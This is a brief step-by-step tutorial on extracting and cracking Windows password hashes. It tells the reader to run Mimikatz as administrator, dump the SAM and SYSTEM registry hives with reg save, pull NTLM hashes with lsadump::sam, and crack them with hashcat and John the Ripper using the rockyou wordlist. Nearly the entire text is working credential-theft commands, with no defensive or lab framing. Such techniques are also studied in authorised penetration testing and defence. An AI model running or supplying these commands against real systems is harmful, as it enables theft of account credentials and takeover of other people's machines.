**1\. Download and Run Mimikatz**

- Download Mimikatz from the official GitHub:  

-  [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)

- Run as an Administrator 



**2\. Dump NTLM Hashes from the SAM Database**

Windows stores NTLM hashes in the **SAM (Security Account Manager) database**.

- Dump SYSTEM & SAM Hives Using Reg Save:

```
reg save HKLM\SYSTEM C:\Users\pc\Desktop\SYSTEM
reg save HKLM\SAM C:\Users\pc\Desktop\SAM
```

- **Enable Debug Mode** (required for some operations):

```
privilege::debug
```

-  Then extract NTLM hashes from the saved SYSTEM and SAM files:

```
lsadump::sam /system:C:\Users\pc\Desktop\SYSTEM /sam:C:\Users\pc\Desktop\SAM
```



**3\. Crack NTLM Hashes with Hashcat or John the Ripper**

After extracting NTLM hashes, you can **crack them** using tools like **Hashcat** or **John the Ripper**.

- Save hashes to a file (`hashes.txt`) and use **Hashcat**:

```
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

- **Crack with John the Ripper**:

```
john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
